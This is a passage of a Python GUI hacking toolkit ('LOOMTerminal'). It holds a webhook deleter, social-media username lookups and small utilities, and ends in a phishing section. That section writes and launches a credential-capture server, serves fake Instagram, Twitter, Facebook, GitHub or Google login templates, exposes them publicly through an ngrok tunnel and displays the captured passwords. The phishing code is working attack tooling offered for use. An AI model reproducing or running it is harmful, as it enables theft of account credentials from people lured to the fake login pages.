                lines.append(f"  - HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def webhook_destroyer(self, url):
        lines = [f"[Webhook Destroyer] Target: {url[:40]}..."]
        try:
            resp = requests.delete(url, timeout=5)
            if resp.status_code == 204:
                lines.append("  + Webhook deleted")
            else:
                lines.append(f"  - HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def webhook_ghost_ping(self, url):
        return "Ghost ping requires user IDs"
    
    # ─── SOCIAL ──────────────────────────────────────────────────────
    
    def roblox_profile(self, username):
        lines = [f"[Roblox] Target: {username}"]
        try:
            resp = requests.get(f"https://api.roblox.com/users/get-by-username?username={username}", timeout=10)
            if resp.status_code == 200:
                data = resp.json()
                if data.get("Id"):
                    lines.append(f"  ID: {data['Id']}")
                    lines.append(f"  URL: https://www.roblox.com/users/{data['Id']}/profile")
                else:
                    lines.append("  - Not found")
            else:
                lines.append(f"  - HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def instagram_lookup(self, username):
        lines = [f"[Instagram] Target: {username}"]
        try:
            session = requests.Session()
            session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})
            resp = session.get(f"https://www.instagram.com/{username}/", timeout=10)
            if resp.status_code == 200:
                if "Page Not Found" in resp.text:
                    lines.append("  - Not found")
                else:
                    lines.append(f"  + Profile exists")
                    lines.append(f"  URL: https://www.instagram.com/{username}/")
            else:
                lines.append(f"  - HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def twitter_lookup(self, username):
        lines = [f"[Twitter] Target: {username}"]
        try:
            session = requests.Session()
            session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})
            resp = session.get(f"https://twitter.com/{username}", timeout=10)
            if resp.status_code == 200:
                if "doesn't exist" in resp.text:
                    lines.append("  - Not found")
                else:
                    lines.append(f"  + Profile exists")
                    lines.append(f"  URL: https://twitter.com/{username}")
            else:
                lines.append(f"  - HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def tiktok_lookup(self, username):
        lines = [f"[TikTok] Target: {username}"]
        try:
            session = requests.Session()
            session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})
            resp = session.get(f"https://www.tiktok.com/@{username}", timeout=10)
            if resp.status_code == 200:
                if "not found" in resp.text:
                    lines.append("  - Not found")
                else:
                    lines.append(f"  + Profile exists")
                    lines.append(f"  URL: https://www.tiktok.com/@{username}")
            else:
                lines.append(f"  - HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def youtube_channel(self, channel):
        lines = [f"[YouTube] Target: {channel}"]
        try:
            session = requests.Session()
            session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})
            resp = session.get(f"https://www.youtube.com/@{channel}", timeout=10)
            if resp.status_code == 200:
                if "not found" in resp.text:
                    lines.append("  - Not found")
                else:
                    lines.append(f"  + Channel exists")
                    lines.append(f"  URL: https://www.youtube.com/@{channel}")
            else:
                lines.append(f"  - HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def telegram_profile(self, username):
        lines = [f"[Telegram] Target: {username}"]
        try:
            session = requests.Session()
            session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})
            resp = session.get(f"https://t.me/{username}", timeout=10)
            if resp.status_code == 200:
                if "does not exist" in resp.text:
                    lines.append("  - Not found")
                else:
                    lines.append(f"  + Profile exists")
                    lines.append(f"  URL: https://t.me/{username}")
            else:
                lines.append(f"  - HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    # ─── UTILITIES ───────────────────────────────────────────────────
    
    def hash_tools(self, text):
        lines = ["[Hash Tools]"]
        for algo in ["md5", "sha1", "sha256", "sha512"]:
            h = hashlib.new(algo)
            h.update(text.encode())
            lines.append(f"  {algo.upper()}: {h.hexdigest()}")
        return "\n".join(lines)
    
    def qr_generator(self, data):
        lines = [f"[QR Generator] Target: {data[:30]}..."]
        try:
            qr = qrcode.QRCode(version=1, box_size=8, border=4)
            qr.add_data(data)
            qr.make(fit=True)
            img = qr.make_image(fill_color="black", back_color="white")
            output_dir = Path("outputs/qr")
            output_dir.mkdir(parents=True, exist_ok=True)
            filename = output_dir / f"qr_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"
            img.save(filename)
            lines.append(f"  + Saved: {filename}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def temp_mail(self, _=None):
        lines = ["[Temporary Email]"]
        try:
            resp = requests.get("https://api.mail.tm/domains", timeout=10)
            if resp.status_code == 200:
                domains = resp.json().get("hydra:member", [])
                if domains:
                    domain = domains[0].get("domain")
                    prefix = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
                    lines.append(f"  Email: {prefix}@{domain}")
            else:
                lines.append(f"  - HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def password_generator(self, length_str):
        try:
            length = int(length_str) if length_str.isdigit() else 16
        except:
            length = 16
        chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
        lines = [f"[Password Generator] Length: {length}"]
        for _ in range(5):
            lines.append(f"  {''.join(random.choice(chars) for _ in range(length))}")
        return "\n".join(lines)
    
    def file_metadata(self, filepath):
        lines = [f"[File Metadata] Target: {filepath}"]
        try:
            path = Path(filepath)
            if not path.exists():
                lines.append("  - File not found")
                return "\n".join(lines)
            stats = path.stat()
            lines.append(f"  Name: {path.name}")
            lines.append(f"  Size: {stats.st_size:,} bytes")
            lines.append(f"  Created: {datetime.fromtimestamp(stats.st_ctime).strftime('%Y-%m-%d %H:%M:%S')}")
            lines.append(f"  Modified: {datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S')}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def website_cloner(self, url):
        lines = [f"[Website Cloner] Target: {url}"]
        try:
            session = requests.Session()
            session.headers.update({"User-Agent": random.choice(CONFIG["user_agents"])})
            resp = session.get(url, timeout=30)
            if resp.status_code == 200:
                soup = BeautifulSoup(resp.text, "html.parser")
                output_dir = Path("clones") / urlparse(url).netloc
                output_dir.mkdir(parents=True, exist_ok=True)
                html_file = output_dir / "index.html"
                with open(html_file, "w", encoding="utf-8") as f:
                    f.write(str(soup))
                lines.append(f"  + Saved: {html_file}")
            else:
                lines.append(f"  - HTTP {resp.status_code}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def json_formatter(self, data):
        lines = ["[JSON Formatter]"]
        try:
            parsed = json.loads(data)
            lines.append(json.dumps(parsed, indent=2))
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    def base64_tools(self, data):
        lines = ["[Base64 Tools]"]
        try:
            encoded = base64.b64encode(data.encode()).decode()
            lines.append(f"  Encoded: {encoded}")
            decoded = base64.b64decode(encoded).decode()
            lines.append(f"  Decoded: {decoded}")
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        return "\n".join(lines)
    
    # ─── PHISHING ─────────────────────────────────────────────────────
    
    def phishing_server(self, _=None):
        lines = ["[Phishing Server]"]
        
        try:
            subprocess.run(["ngrok", "--version"], capture_output=True, check=True)
            has_ngrok = True
        except:
            has_ngrok = False
        
        if not has_ngrok:
            lines.append("  ! ngrok not found. Install from https://ngrok.com")
            lines.append("  ! Starting local server only on port 8080")
        
        template = simpledialog.askstring("Phishing Server", 
                                           "Enter template (instagram/twitter/facebook/github/google):",
                                           initialvalue="instagram")
        if not template:
            template = "instagram"
        
        self.phishing_dir = tempfile.mkdtemp(prefix="loom_phish_")
        
        html = PHISHING_TEMPLATES.get(template, PHISHING_TEMPLATES["instagram"])
        html_path = Path(self.phishing_dir) / "index.html"
        with open(html_path, "w") as f:
            f.write(html)
        
        capture_code = '''
import http.server
import socketserver
import urllib.parse
from datetime import datetime

class Handler(http.server.SimpleHTTPRequestHandler):
    def do_POST(self):
        if self.path == "/capture":
            length = int(self.headers['Content-Length'])
            data = urllib.parse.parse_qs(self.rfile.read(length).decode())
            with open("credentials.txt", "a") as f:
                f.write(f"[{datetime.now()}] {data}\\n")
            self.send_response(302)
            self.send_header("Location", "https://www.google.com")
            self.end_headers()
        else:
            self.send_error(404)

with socketserver.TCPServer(("", 8080), Handler) as httpd:
    print("Server running on port 8080")
    httpd.serve_forever()
'''
        capture_path = Path(self.phishing_dir) / "capture.py"
        capture_path.write_text(capture_code)
        
        try:
            self.phishing_process = subprocess.Popen(
                [sys.executable, str(capture_path)],
                cwd=self.phishing_dir,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE
            )
            
            lines.append(f"  + Server started on http://localhost:8080")
            lines.append(f"  + Template: {template}")
            lines.append(f"  + Credentials: {self.phishing_dir}/credentials.txt")
            
            if has_ngrok:
                ngrok_proc = subprocess.Popen(
                    ["ngrok", "http", "8080"],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE
                )
                time.sleep(2)
                try:
                    resp = requests.get("http://localhost:4040/api/tunnels", timeout=5)
                    if resp.status_code == 200:
                        tunnels = resp.json().get("tunnels", [])
                        if tunnels:
                            public_url = tunnels[0].get("public_url")
                            lines.append(f"  + Public URL: {public_url}")
                except:
                    lines.append("  ! Could not get ngrok URL")
            
            webbrowser.open("http://localhost:8080")
            
        except Exception as e:
            lines.append(f"  - Error: {str(e)}")
        
        return "\n".join(lines)
    
    def deploy_template(self, _=None):
        lines = ["[Deploy Template]"]
        if not self.phishing_process:
            lines.append("  ! Start phishing server first")
            return "\n".join(lines)
        
        template = simpledialog.askstring("Deploy Template", 
                                           "Enter template (instagram/twitter/facebook/github/google):",
                                           initialvalue="instagram")
        if not template:
            template = "instagram"
        
        html = PHISHING_TEMPLATES.get(template, PHISHING_TEMPLATES["instagram"])
        html_path = Path(self.phishing_dir) / "index.html"
        with open(html_path, "w") as f:
            f.write(html)
        lines.append(f"  + Deployed: {template}")
        return "\n".join(lines)
    
    def view_creds(self, _=None):
        lines = ["[Captured Credentials]"]
        if not self.phishing_dir:
            lines.append("  ! Start phishing server first")
            return "\n".join(lines)
        
        creds_file = Path(self.phishing_dir) / "credentials.txt"
        if creds_file.exists():
            content = creds_file.read_text()
            if content:
                lines.append(content)
            else:
                lines.append("  - No credentials captured yet")
        else:
            lines.append("  - No credentials captured yet")
        return "\n".join(lines)
    
    def quit(self):
        """Quit the application"""
        if self.phishing_process:
            self.phishing_process.terminate()
        self.root.destroy()

# ─── MAIN ──────────────────────────────────────────────────────────
def main():
    root = tk.Tk()
    app = LOOMTerminal(root)
    root.mainloop()

if __name__ == "__main__":
    main()
